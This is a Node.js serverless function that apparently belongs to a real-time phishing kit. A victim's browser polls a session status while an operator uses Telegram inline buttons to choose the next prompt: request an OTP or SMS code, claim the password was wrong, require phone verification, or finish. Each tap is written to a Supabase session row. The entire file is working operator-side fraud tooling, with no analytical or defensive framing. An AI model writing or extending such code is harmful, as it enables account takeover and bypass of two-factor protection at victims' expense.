// poll-session.js
// Browser calls this every second. It does two things:
// 1. Asks Telegram for any new button clicks (getUpdates)
// 2. Returns the session status from Supabase

import { dbSelectOne, dbUpdate, dbUpsert } from './_supabase.js';

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;

const COMMAND_MAP = {
  otp:       'otp_required',
  sms:       'sms_code',
  phone:     'phone_verification',
  success:   'success',
  incorrect: 'incorrect_password',
  sua:       'sua',
};

// Offset stored in Supabase so it persists across function instances
const OFFSET_TABLE = 'telegram_offset';

export const handler = async (event) => {
  if (event.httpMethod !== 'GET') {
    return { statusCode: 405, body: 'Method not allowed' };
  }

  const sessionId = event.queryStringParameters?.sessionId;
  if (!sessionId) return ok({ status: 'waiting' });

  try {
    // Step 1: Fetch and process any pending Telegram button clicks
    await processTelegramUpdates();

    // Step 2: Read session status from Supabase
    const row = await dbSelectOne('sessions', { id: sessionId }, 'status,response_type,email');
    if (!row) return ok({ status: 'waiting' });

    return ok({
      status:       row.status,
      responseType: row.response_type,
      email:        row.email,
    });
  } catch (e) {
    console.error('poll-session error:', e.message);
    return ok({ status: 'waiting', error: e.message });
  }
};

async function processTelegramUpdates() {
  // Get current offset from Supabase
  const offsetRow = await dbSelectOne('telegram_offset', { id: 1 }, 'offset_value').catch(() => null);
  const offset    = offsetRow?.offset_value || 0;

  // Call Telegram getUpdates
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?limit=10&timeout=0&offset=${offset}&allowed_updates=["callback_query"]`;

  const r = await fetch(url, { signal: AbortSignal.timeout(5000) });
  if (!r.ok) {
    console.error('getUpdates failed:', r.status);
    return;
  }

  const data = await r.json();
  if (!data.ok || !data.result?.length) return;

  console.log(`Processing ${data.result.length} Telegram update(s)`);

  let maxUpdateId = offset - 1;

  for (const update of data.result) {
    maxUpdateId = Math.max(maxUpdateId, update.update_id);

    if (!update.callback_query) continue;

    const cb     = update.callback_query;
    const cbId   = cb.id;
    const cbData = cb.data || '';

    console.log('callback_query:', cbData);

    const match = cbData.match(/^([a-z]+)_([a-f0-9]{32})$/);
    if (!match) {
      console.error('Regex no match for:', cbData);
      continue;
    }

    const action       = match[1];
    const sessionId    = match[2];
    const responseType = COMMAND_MAP[action];

    if (!responseType) {
      console.error('Unknown action:', action);
      continue;
    }

    // Guard: check current session status before overwriting
    // If session is 'pending', it was already handled and reset — skip this update
    // to prevent re-processing the same button click when offset wasn't saved
    const currentSession = await dbSelectOne('sessions', { id: sessionId }, 'status,response_type').catch(() => null);
    if (currentSession && currentSession.status === 'responded') {
      // Only update if session is still in responded state from a previous click
      // (This shouldn't happen normally but guards against offset failures)
      console.log('Session already responded, overwriting:', sessionId, '->', responseType);
    } else if (currentSession && currentSession.status === 'pending') {
      console.log('Session is pending (already processed + reset), skipping duplicate:', sessionId, cbData);
      await answerCallback(cbId, '✅ Already processed!');
      continue;
    }

    // Update session in Supabase
    await dbUpdate('sessions', {
      status:        'responded',
      response_type: responseType,
      responded_at:  new Date().toISOString(),
      last_update:   new Date().toISOString(),
    }, { id: sessionId });

    console.log(`Session ${sessionId} → ${responseType}`);

    // Remove inline buttons from the tapped message
    const msgId  = update.callback_query.message?.message_id;
    const chatId = update.callback_query.message?.chat?.id;
    if (msgId && chatId) {
      await removeButtons(chatId, msgId);
    }

    // Acknowledge the button tap in Telegram
    await answerCallback(cbId, `✅ ${action.charAt(0).toUpperCase() + action.slice(1)} triggered!`);
  }

  // Advance offset — CRITICAL: if this fails, the same button click is re-processed
  const newOffset = maxUpdateId + 1;
  try {
    await dbUpsert('telegram_offset', { id: 1, offset_value: newOffset });
    console.log('Offset advanced to:', newOffset);
  } catch (e) {
    // This is the most common cause of duplicate button processing
    // If telegram_offset table doesn't exist, run the updated supabase-schema.sql
    console.error('CRITICAL: Failed to save Telegram offset:', e.message);
    console.error('Table telegram_offset may not exist — run supabase-schema.sql again');
  }
}

async function removeButtons(chatId, messageId) {
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body:    JSON.stringify({ chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard: [] } }),
      signal:  AbortSignal.timeout(5000),
    });
  } catch (e) {
    console.error('removeButtons error:', e.message);
  }
}

async function answerCallback(cbId, text) {
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body:    JSON.stringify({ callback_query_id: cbId, text }),
      signal:  AbortSignal.timeout(5000),
    });
  } catch (e) {
    console.error('answerCallback error:', e.message);
  }
}

const ok = (b) => ({
  statusCode: 200,
  headers:    { 'Content-Type': 'application/json' },
  body:       JSON.stringify(b),
});
